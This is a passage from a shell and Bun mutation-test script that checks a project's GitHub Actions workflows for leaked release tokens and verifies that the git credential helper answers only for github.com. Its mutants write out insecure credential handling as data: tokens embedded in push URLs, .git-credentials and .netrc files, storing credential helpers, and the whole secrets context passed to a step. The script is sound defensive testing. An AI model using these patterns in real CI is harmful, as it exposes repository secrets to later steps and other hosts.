	'secrets.RELEASE_PR_TOKEN is read 3 times'
expect_caught 'the whole secrets context handed to a step' catalog-pr "$WORKFLOWS/sync-pieces-catalog.yml" \
	'          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          HELD_COUNT:' '          GH_TOKEN: ${{ toJSON(secrets) }}
          HELD_COUNT:' \
	'the whole secrets context is read somewhere'
expect_caught 'a refusal whose exit 1 is in a later, unrelated if' catalog-pr "$WORKFLOWS/sync-pieces-catalog.yml" \
	$'on this repository."\n            exit 1\n          fi\n' $'on this repository."\n          fi\n          if false; then exit 1; fi\n' \
	'no earlier step refuses when RELEASE_PR_TOKEN is empty'
expect_caught 'the catalog PR opened with GITHUB_TOKEN (#935)' catalog-pr "$WORKFLOWS/sync-pieces-catalog.yml" \
	'          token: ${{ secrets.RELEASE_PR_TOKEN }}' '          token: ${{ secrets.GITHUB_TOKEN }}' \
	'publish: step Open PR with catalog changes: token is'
expect_caught 'the catalog PR opened with the default token (#935)' catalog-pr "$WORKFLOWS/sync-pieces-catalog.yml" \
	$'          token: ${{ secrets.RELEASE_PR_TOKEN }}\n' '' \
	'token is "the default github.token"'
expect_caught 'the catalog PR falling back to GITHUB_TOKEN (#935)' catalog-pr "$WORKFLOWS/sync-pieces-catalog.yml" \
	'          token: ${{ secrets.RELEASE_PR_TOKEN }}' '          token: ${{ secrets.RELEASE_PR_TOKEN || secrets.GITHUB_TOKEN }}' \
	'not secrets.RELEASE_PR_TOKEN alone'
expect_caught 'the catalog branch pushed with another token (#935)' catalog-pr "$WORKFLOWS/sync-pieces-catalog.yml" \
	'          token: ${{ secrets.RELEASE_PR_TOKEN }}' $'          token: ${{ secrets.RELEASE_PR_TOKEN }}\n          branch-token: ${{ github.token }}' \
	'branch-token is'
expect_caught 'the catalog PR with no refusal when its token is missing' catalog-pr "$WORKFLOWS/sync-pieces-catalog.yml" \
	'          if [ -z "$CATALOG_PR_TOKEN" ]; then' '          if false; then' \
	'no earlier step refuses when RELEASE_PR_TOKEN is empty'
expect_caught 'a refusal that only warns' catalog-pr "$WORKFLOWS/sync-pieces-catalog.yml" \
	$'on this repository."\n            exit 1\n' $'on this repository."\n' \
	'no earlier step refuses when RELEASE_PR_TOKEN is empty'
expect_caught 'a refusal under another condition than the PR step' catalog-pr "$WORKFLOWS/sync-pieces-catalog.yml" \
	$'      - name: Refuse without the catalog PR token\n        if: needs.generate.outputs.has_changes == \'true\'\n' \
	$'      - name: Refuse without the catalog PR token\n        if: needs.generate.outputs.held_count != \'0\'\n' \
	'no earlier step refuses when RELEASE_PR_TOKEN is empty'
expect_caught 'a refusal that cannot fail its step' catalog-pr "$WORKFLOWS/sync-pieces-catalog.yml" \
	$'      - name: Refuse without the catalog PR token\n' $'      - name: Refuse without the catalog PR token\n        continue-on-error: true\n' \
	'no earlier step refuses when RELEASE_PR_TOKEN is empty'
expect_caught 'a refusal in a job that cannot fail' catalog-pr "$WORKFLOWS/sync-pieces-catalog.yml" \
	$'    timeout-minutes: 15\n    # GITHUB_TOKEN only reads' $'    timeout-minutes: 15\n    continue-on-error: true\n    # GITHUB_TOKEN only reads' \
	'no earlier step refuses when RELEASE_PR_TOKEN is empty'
expect_caught 'a refusal whose exit 1 is outside its test' catalog-pr "$WORKFLOWS/sync-pieces-catalog.yml" \
	$'on this repository."\n            exit 1\n          fi\n' $'on this repository."\n          fi\n          true || exit 1\n' \
	'no earlier step refuses when RELEASE_PR_TOKEN is empty'
expect_caught 'a refusal that tests GITHUB_TOKEN instead' catalog-pr "$WORKFLOWS/sync-pieces-catalog.yml" \
	'          CATALOG_PR_TOKEN: ${{ secrets.RELEASE_PR_TOKEN }}' '          CATALOG_PR_TOKEN: ${{ secrets.GITHUB_TOKEN }}' \
	'no earlier step refuses when RELEASE_PR_TOKEN is empty'
expect_caught 'a PR opened before the refusal runs' catalog-pr "$WORKFLOWS/sync-pieces-catalog.yml" \
	'      - name: Refuse without the catalog PR token' $'      - name: Open early\n        uses: peter-evans/create-pull-request@5f6978faf089d4d20b00c7766989d076bb2fc7f1 # v8.1.1\n        with:\n          token: ${{ secrets.RELEASE_PR_TOKEN }}\n      - name: Refuse without the catalog PR token' \
	'publish: step Open early: no earlier step refuses when RELEASE_PR_TOKEN is empty'

echo
echo "no checkout leaves a write token or a secret on disk, and a push brings its own credential (#982)"
# shellcheck disable=SC2016 # literal workflow text, not shell.
{
	expect_caught 'the release cut job leaving its PAT in .git/config (#982)' narrow "$WORKFLOWS/release.yml" \
		$'          token: ${{ secrets.RELEASE_PR_TOKEN }}\n          persist-credentials: false\n' $'          token: ${{ secrets.RELEASE_PR_TOKEN }}\n' \
		'cut: checkout leaves the token in .git/config'
	expect_caught 'the release cut job persisting its PAT on purpose (#982)' narrow "$WORKFLOWS/release.yml" \
		$'          token: ${{ secrets.RELEASE_PR_TOKEN }}\n          persist-credentials: false\n' $'          token: ${{ secrets.RELEASE_PR_TOKEN }}\n          persist-credentials: true\n' \
		'cut: checkout leaves the token in .git/config'
	expect_caught 'a write-scoped job off the release path persisting its token (#982)' narrow "$WORKFLOWS/update-webview.yml" \
		$'        with:\n          persist-credentials: false\n      - uses: actions/setup-go@' '      - uses: actions/setup-go@' \
		'update: checkout leaves the token in .git/config'
	expect_caught 'a read-only job persisting a secret it checked out with (#982)' narrow "$WORKFLOWS/docker-build.yml" \
		$'      - uses: actions/checkout@v7\n' $'      - uses: actions/checkout@v7\n        with:\n          token: ${{ secrets.SOME_PAT }}\n' \
		'docker-build: checkout leaves the token in .git/config'
	expect_caught 'the same checkout spelled in another case (#982)' narrow "$WORKFLOWS/docker-build.yml" \
		$'      - uses: actions/checkout@v7\n' $'      - uses: Actions/Checkout@v7\n        with:\n          token: ${{ secrets.SOME_PAT }}\n' \
		'docker-build: checkout leaves the token in .git/config'
	expect_caught 'the release branch pushed with no credential helper (#982)' narrow "$WORKFLOWS/release.yml" \
		$'          GIT_CONFIG_KEY_1: credential.https://github.com.helper\n' '' \
		'cut: step Create release PR runs git against a remote with no credential'
	expect_caught 'the release branch pushed with an empty credential helper (#982)' narrow "$WORKFLOWS/release.yml" \
		"          GIT_CONFIG_VALUE_1: '!f()" $'          GIT_CONFIG_VALUE_1: ""\n          x-was: \'!f()' \
		'cut: step Create release PR runs git against a remote with no credential'
	expect_caught 'the release branch delete back on git, with no credential (#982)' narrow "$WORKFLOWS/release.yml" \
		'          if ! gh api -X DELETE "repos/${GITHUB_REPOSITORY}/git/refs/heads/release/v${NEW}"; then' '          if ! git push origin --delete "release/v${NEW}"; then' \
		'cut: step Delete release branch runs git against a remote with no credential'
	expect_caught 'the cleanup delete back on git -C, with no credential (#982)' narrow "$WORKFLOWS/release.yml" \
		'          if [ -n "$NEW" ] && ! gh api -X DELETE "repos/${GITHUB_REPOSITORY}/git/refs/heads/release/v${NEW}"; then' '          if [ -n "$NEW" ] && ! git -C . push origin --delete "release/v${NEW}"; then' \
		'cut: step Clean up on failure runs git against a remote with no credential'
	expect_caught 'the release branch pushed with the token in its URL (#982)' narrow "$WORKFLOWS/release.yml" \
		'          git push origin "$BRANCH"' '          git push "https://x-access-token:${GH_TOKEN}@github.com/${GITHUB_REPOSITORY}.git" "$BRANCH"' \
		'cut: puts a credential in a URL'
	expect_caught 'the token in a URL as a spaced expression (#982 review)' narrow "$WORKFLOWS/release.yml" \
		'          git push origin "$BRANCH"' '          git push "https://x-access-token:${{ secrets.RELEASE_PR_TOKEN }}@github.com/${GITHUB_REPOSITORY}.git" "$BRANCH"' \
		'cut: puts a credential in a URL'
	expect_caught 'the token in a URL split by quotes (#982 review)' narrow "$WORKFLOWS/release.yml" \
		'          git push origin "$BRANCH"' '          git push "https://x-access-token:"$GH_TOKEN"@github.com/${GITHUB_REPOSITORY}.git" "$BRANCH"' \
		'cut: puts a credential in a URL'
	expect_caught 'the token in a URL held in step env (#982 review)' narrow "$WORKFLOWS/release.yml" \
		'          GIT_TERMINAL_PROMPT: "0"' $'          PUSH_URL: https://x-access-token:${{ secrets.RELEASE_PR_TOKEN }}@github.com/vierisid/jarvis.git\n          GIT_TERMINAL_PROMPT: "0"' \
		'cut: puts a credential in a URL'
	expect_caught 'a storing helper as the reset entry (#982 review)' narrow "$WORKFLOWS/release.yml" \
		'          GIT_CONFIG_VALUE_0: ""' '          GIT_CONFIG_VALUE_0: store' \
		'cut: step Create release PR configures the credential helper "store"'
	expect_caught 'the helper beyond GIT_CONFIG_COUNT, so git never reads it (#982 review)' narrow "$WORKFLOWS/release.yml" \
		'          GIT_CONFIG_COUNT: "2"' '          GIT_CONFIG_COUNT: "1"' \
		'cut: step Create release PR runs git against a remote with no credential'
	expect_caught 'the PAT written back into .git/config as an extraheader (#982 review)' narrow "$WORKFLOWS/release.yml" \
		'          git push origin "$BRANCH"' $'          git config http.https://github.com/.extraheader "AUTHORIZATION: basic x"\n          git push origin "$BRANCH"' \
		'cut: writes a git credential where every later step can read it'
	expect_caught 'an extraheader on the git command line (#982 review)' narrow "$WORKFLOWS/release.yml" \
		'          git push origin "$BRANCH"' '          git -c http.extraheader="AUTHORIZATION: basic x" push origin "$BRANCH"' \
		'cut: writes a git credential where every later step can read it'
	expect_caught 'a .git-credentials file written (#982 review)' narrow "$WORKFLOWS/release.yml" \
		'          git push origin "$BRANCH"' $'          printf \x27https://x:%s@github.com\\n\x27 "$GH_TOKEN" >~/.git-credentials\n          git push origin "$BRANCH"' \
		'cut: writes a git credential where every later step can read it'
	expect_caught 'a remote git command continued onto the next line (#982 review)' narrow "$WORKFLOWS/release.yml" \
		'          if ! gh api -X DELETE "repos/${GITHUB_REPOSITORY}/git/refs/heads/release/v${NEW}"; then' $'          if ! git \\\n            push origin --delete "release/v${NEW}"; then' \
		'cut: step Delete release branch runs git against a remote with no credential'
	expect_caught 'a remote git command behind --git-dir (#982 review)' narrow "$WORKFLOWS/release.yml" \
		'          if ! gh api -X DELETE "repos/${GITHUB_REPOSITORY}/git/refs/heads/release/v${NEW}"; then' '          if ! git --git-dir .git push origin --delete "release/v${NEW}"; then' \
		'cut: step Delete release branch runs git against a remote with no credential'
	expect_caught 'git config in the job env, reaching every step (#982 review 2)' narrow "$WORKFLOWS/release.yml" \
		$'    env:\n      GH_TOKEN: ${{ github.token }}\n' $'    env:\n      GH_TOKEN: ${{ github.token }}\n      GIT_CONFIG_COUNT: "1"\n      GIT_CONFIG_KEY_0: http.https://github.com/.extraheader\n      GIT_CONFIG_VALUE_0: "AUTHORIZATION: basic ${{ secrets.RELEASE_PR_TOKEN }}"\n' \
		'cut: job env sets GIT_CONFIG_COUNT'
	expect_caught 'an extraheader given in the step env (#982 review 2)' narrow "$WORKFLOWS/release.yml" \
		'          GIT_CONFIG_KEY_0: credential.helper' '          GIT_CONFIG_KEY_0: http.https://github.com/.extraheader' \
		'cut: step Create release PR sets http.https://github.com/.extraheader through the environment'
	expect_caught 'GIT_CONFIG_PARAMETERS in the step env (#982 review 2)' narrow "$WORKFLOWS/release.yml" \
		'          GIT_TERMINAL_PROMPT: "0"' $'          GIT_CONFIG_PARAMETERS: "\x27credential.helper\x27=\x27store\x27"\n          GIT_TERMINAL_PROMPT: "0"' \
		'cut: step Create release PR sets GIT_CONFIG_PARAMETERS'
	expect_caught 'an inline helper that calls the storing one (#982 review 2)' narrow "$WORKFLOWS/release.yml" \
		'          GIT_CONFIG_VALUE_0: ""' '          GIT_CONFIG_VALUE_0: "!git credential-store"' \
		'configures the credential helper "!git credential-store"'
	expect_caught 'the helper key spelled with a leading zero, which git never reads (#982 review 2)' narrow "$WORKFLOWS/release.yml" \
		$'          GIT_CONFIG_KEY_1: credential.https://github.com.helper\n          GIT_CONFIG_VALUE_1: ' $'          GIT_CONFIG_KEY_01: credential.https://github.com.helper\n          GIT_CONFIG_VALUE_01: ' \
		'cut: step Create release PR runs git against a remote with no credential'
	expect_caught 'an extraheader written across a continuation line (#982 review 2)' narrow "$WORKFLOWS/release.yml" \
		'          git push origin "$BRANCH"' $'          git config --global \\\n            http.https://github.com/.extraheader "AUTHORIZATION: basic x"\n          git push origin "$BRANCH"' \
		'cut: writes a git credential where every later step can read it'
	expect_caught 'a storing helper on a continued command line (#982 review 2)' narrow "$WORKFLOWS/release.yml" \
		'          git push origin "$BRANCH"' $'          git -c \\\n            credential.helper=store push origin "$BRANCH"' \
		'cut: writes a git credential where every later step can read it'
	expect_caught 'an insteadOf carrying the token (#982 review 2)' narrow "$WORKFLOWS/release.yml" \
		'          git push origin "$BRANCH"' $'          git config url.https://x@github.com/.insteadOf https://github.com/\n          git push origin "$BRANCH"' \
		'cut: writes a git credential where every later step can read it'
	expect_caught 'the storing helper run directly (#982 review 2)' narrow "$WORKFLOWS/release.yml" \
		'          git push origin "$BRANCH"' $'          printf \x27protocol=https\\nhost=github.com\\nusername=x\\npassword=%s\\n\x27 "$GH_TOKEN" | git credential-store store\n          git push origin "$BRANCH"' \
		'cut: writes a git credential where every later step can read it'
	expect_caught 'gh auth login, which writes the token under ~/.config (#982 review 2)' narrow "$WORKFLOWS/release.yml" \
		'          git push origin "$BRANCH"' $'          gh auth login --with-token <<<"$GH_TOKEN"\n          git push origin "$BRANCH"' \
		'cut: writes a git credential where every later step can read it'
	expect_caught 'a .netrc written with no space before it (#982 review 2)' narrow "$WORKFLOWS/release.yml" \
		'          git push origin "$BRANCH"' $'          echo "machine github.com password $GH_TOKEN" >.netrc\n          git push origin "$BRANCH"' \
		'cut: writes a git credential where every later step can read it'
	expect_caught 'a .gitconfig written by hand (#982 review 2)' narrow "$WORKFLOWS/release.yml" \
		'          git push origin "$BRANCH"' $'          printf \x27[credential]\\n\\thelper = store\\n\x27 >>~/.gitconfig\n          git push origin "$BRANCH"' \
		'cut: writes a git credential where every later step can read it'
	expect_caught 'the token in a URL held in workflow env (#982 review 2)' narrow "$WORKFLOWS/release.yml" \
		$'jobs:\n  cut:\n' $'env:\n  PUSH_URL: https://x-access-token:${{ secrets.RELEASE_PR_TOKEN }}@github.com/vierisid/jarvis.git\njobs:\n  cut:\n' \
		'cut: puts a credential in a URL'
	expect_caught 'the token in a URL through format() (#982 review 2)' narrow "$WORKFLOWS/release.yml" \
		'          GIT_TERMINAL_PROMPT: "0"' $'          PUSH_URL: https://x-access-token:${{ format(\x27{0}\x27, secrets.RELEASE_PR_TOKEN) }}@github.com/vierisid/jarvis.git\n          GIT_TERMINAL_PROMPT: "0"' \
		'cut: puts a credential in a URL'
	expect_caught 'the token in a URL through a command substitution (#982 review 2)' narrow "$WORKFLOWS/release.yml" \
		'          git push origin "$BRANCH"' '          git push "https://x-access-token:$(printenv GH_TOKEN)@github.com/${GITHUB_REPOSITORY}.git" "$BRANCH"' \
		'cut: puts a credential in a URL'
	expect_caught 'the token in a URL built by printf (#982 review 2)' narrow "$WORKFLOWS/release.yml" \
		'          git push origin "$BRANCH"' $'          url="$(printf \x27https://x-access-token:%s@github.com/%s.git\x27 "$GH_TOKEN" "$GITHUB_REPOSITORY")"\n          git push "$url" "$BRANCH"' \
		'cut: puts a credential in a URL'
}
# The helper itself, executed (#982): git asks it exactly as `git credential
# fill` does, with the step env as the workflow writes it and each expression
# replaced by a marker, and nothing else (no user or system git config, no
# inherited GIT_* variables). For github.com it must answer with the value of
# secrets.RELEASE_PR_TOKEN, for any other host with nothing, and with that
# secret empty with nothing, and git may never fall back to a prompt.
# push_cred_check <workflow>: one violation per line, nothing when clean.
push_cred_check() {
	# shellcheck disable=SC2016 # JavaScript source, not shell.
	FILE="$1" SCRATCH="${WORK}/pushcred" bun -e '
const fs = require("node:fs");
const doc = Bun.YAML.parse(fs.readFileSync(process.env.FILE, "utf8"));
const out = [];
fs.rmSync(process.env.SCRATCH, { recursive: true, force: true });
fs.mkdirSync(process.env.SCRATCH + "/home", { recursive: true });
let found = 0;
for (const [name, job] of Object.entries(doc.jobs ?? {}))
  for (const [i, st] of (job.steps ?? []).entries()) {
    // Any git push in the step, wherever it sits in a line.
    if (typeof st.run !== "string" || !/(?:^|[;&|(!{`]\s*|\b(?:then|do|else|if|elif|while|until)\s+)git\s+(?:-\S+\s+(?:[^\s-]\S*\s+)?)*push\b/m.test(st.run.replace(/\\\n/g, " "))) continue;
    found++;
    const label = name + ": step " + (st.name ?? st.id ?? String(i));
    const env = {};
    let pat = null;
    // The env the step runs with: workflow, job, then step.
    for (const [k, v] of Object.entries({ ...(doc.env ?? {}), ...(job.env ?? {}), ...(st.env ?? {}) })) {
      const s = String(v);
      if (/^\$\{\{\s*secrets\.RELEASE_PR_TOKEN\s*\}\}$/.test(s)) { env[k] = "pat-marker-" + k; pat = k; }
      else env[k] = s.includes("${{") ? "expr-marker-" + k : s;
    }
    if (env.GIT_TERMINAL_PROMPT !== "0") { out.push(label + ": GIT_TERMINAL_PROMPT is not 0, so a missing credential can wait on a prompt"); continue; }
    const fill = (host, extra = {}) => {
      const r = Bun.spawnSync(["git", "credential", "fill"], {
        cwd: process.env.SCRATCH, timeout: 20000,
        env: { PATH: process.env.PATH, HOME: process.env.SCRATCH + "/home", GIT_CONFIG_NOSYSTEM: "1", GIT_CONFIG_GLOBAL: "/dev/null", ...env, ...extra },
        stdin: Buffer.from("protocol=https\nhost=" + host + "\npath=vierisid/jarvis\n\n"),
      });
      return { code: r.exitCode, text: r.stdout.toString() };
    };
    const gh = fill("github.com");
    const pw = /^password=(.*)$/m.exec(gh.text)?.[1];
    if (!pat) out.push(label + ": no step env carries secrets.RELEASE_PR_TOKEN alone, so the push is not made by the PAT");
    else if (gh.code !== 0 || pw !== "pat-marker-" + pat) out.push(label + ": git gets " + JSON.stringify(pw ?? null) + " for github.com, not secrets.RELEASE_PR_TOKEN (exit " + gh.code + ")");
    // After a push git hands the credential back (approve), which is when a
    // storing helper writes it down; nothing may then hold the marker.
    if (gh.code === 0) {
      Bun.spawnSync(["git", "credential", "approve"], {
        cwd: process.env.SCRATCH, timeout: 20000,
        env: { PATH: process.env.PATH, HOME: process.env.SCRATCH + "/home", GIT_CONFIG_NOSYSTEM: "1", GIT_CONFIG_GLOBAL: "/dev/null", ...env },
        stdin: Buffer.from(gh.text + "\n"),
      });
      const kept = (dir) => fs.readdirSync(dir, { recursive: true, withFileTypes: true }).filter((e) => e.isFile())
        .filter((e) => fs.readFileSync(require("node:path").join(e.parentPath ?? e.path, e.name), "utf8").includes("pat-marker-"));
      if (kept(process.env.SCRATCH).length) out.push(label + ": the push credential is written to disk after the push (a storing helper)");
    }
    const other = fill("example.com");
    if (other.code === 0 || /marker/.test(other.text)) out.push(label + ": the push credential is offered to a host other than github.com");
    if (pat) {
      const empty = fill("github.com", { [pat]: "" });
      if (empty.code === 0) out.push(label + ": with secrets.RELEASE_PR_TOKEN empty git still gets a credential");
    }
  }
if (!found) out.push("no step runs git push, so the push credential check checked nothing");
// The PAT is read exactly three times: the refusal, the checkout token
// (persisted nowhere) and the push step env. Anywhere else it reaches code
// this check has not looked at.
const patReads = [...JSON.stringify({ env: doc.env, jobs: doc.jobs }).matchAll(/\$\{\{([\s\S]*?)\}\}/g)]
  .filter((m) => /\bsecrets\s*(?:\.\s*RELEASE_PR_TOKEN\b|\[)|\btoJSON\s*\(\s*secrets\b/i.test(m[1])).length;
if (patReads !== 3) out.push("secrets.RELEASE_PR_TOKEN is read " + patReads + " times; expected 3 (the refusal env, the checkout token, the push step env)");
if (out.length) console.log(out.join("\n"));
'
}
found="$(push_cred_check "$WORKFLOWS/release.yml")"
if [ -z "$found" ]; then
	ok "release.yml: the branch push gets secrets.RELEASE_PR_TOKEN from its step env, for github.com alone (#982)"
else
	no "release.yml: the branch push gets secrets.RELEASE_PR_TOKEN from its step env, for github.com alone (#982)" "$found"
fi
# push_cred_caught <label> <exact text> <replacement> <reason>
push_cred_caught() {
	local copy="${WORK}/release-push.yml"
	if ! FROM="$WORKFLOWS/release.yml" TO="$copy" OLD="$2" NEW="$3" bun -e '
const s = await Bun.file(process.env.FROM).text();
if (!s.includes(process.env.OLD)) { console.error("anchor not found"); process.exit(2); }
await Bun.write(process.env.TO, s.replace(process.env.OLD, process.env.NEW));
'; then
		no "push credential mutant '$1' could be applied (release.yml no longer has the text it mutates)"
		return
	fi
	found="$(push_cred_check "$copy")"
	if grep -qF -- "$4" <<<"$found"; then ok "reports: $1"; else no "reports: $1, for the reason it exists" "wanted '${4}', got: ${found}"; fi
}
# shellcheck disable=SC2016 # literal workflow text, not shell.
{
	push_cred_caught 'the helper answering for every host (#982)' \
		'          GIT_CONFIG_KEY_1: credential.https://github.com.helper' '          GIT_CONFIG_KEY_1: credential.helper' \
		'offered to a host other than github.com'
	push_cred_caught 'the helper reading a variable the step does not set (#982)' \
		'password=%s\n" "$GH_TOKEN"' 'password=%s\n" "$PUSH_TOKEN"' \
		'not secrets.RELEASE_PR_TOKEN'
	push_cred_caught 'the push made with the job token instead of the PAT (#982)' \
		$'          GH_TOKEN: ${{ secrets.RELEASE_PR_TOKEN }}\n          # The branch push' $'          GH_TOKEN: ${{ github.token }}\n          # The branch push' \
		'no step env carries secrets.RELEASE_PR_TOKEN alone'
	push_cred_caught 'the helper answering with the token empty (#982)' \
		'] && [ -n "$GH_TOKEN" ]; then' ']; then' \
		'with secrets.RELEASE_PR_TOKEN empty git still gets a credential'
	push_cred_caught 'a storing helper as the reset entry, writing the PAT after the push (#982 review)' \
		'          GIT_CONFIG_VALUE_0: ""' '          GIT_CONFIG_VALUE_0: store' \
		'written to disk after the push'
	push_cred_caught 'a second push mid-line, with no helper of its own (#982 review 2)' \
		'          if ! gh api -X DELETE "repos/${GITHUB_REPOSITORY}/git/refs/heads/release/v${NEW}"; then' '          if ! git push origin --delete "release/v${NEW}"; then' \
		'cut: step Delete release branch: GIT_TERMINAL_PROMPT is not 0'
	push_cred_caught 'the PAT read by another step (#982 review 2)' \
		'          PR_URL: ${{ steps.pr.outputs.PR_URL }}' $'          PR_URL: ${{ steps.pr.outputs.PR_URL }}\n          EXTRA: ${{ secrets.RELEASE_PR_TOKEN }}' \
		'secrets.RELEASE_PR_TOKEN is read 4 times'
	push_cred_caught 'git allowed to prompt for a credential (#982)' \
		'          GIT_TERMINAL_PROMPT: "0"' '          GIT_TERMINAL_PROMPT: "1"' \
		'GIT_TERMINAL_PROMPT is not 0'
}

echo
echo "${pass} passed, ${fail} failed"
[ "$fail" -eq 0 ]
